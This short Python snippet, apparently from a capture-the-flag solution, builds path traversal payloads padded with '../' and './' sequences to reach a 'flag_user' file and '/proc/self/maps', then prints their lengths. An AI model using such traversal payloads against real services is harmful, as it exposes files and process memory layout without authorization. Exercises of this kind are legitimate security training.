file_path  = b'../../../..////////////////////////////////////////////////////////////////////////////////////////flag_user'
print(len(file_path))

file_name =  b'proc/self/maps'
payload = b'../../../' + b'./' * (49 - len(file_name) // 2) +  file_name
print(len(payload))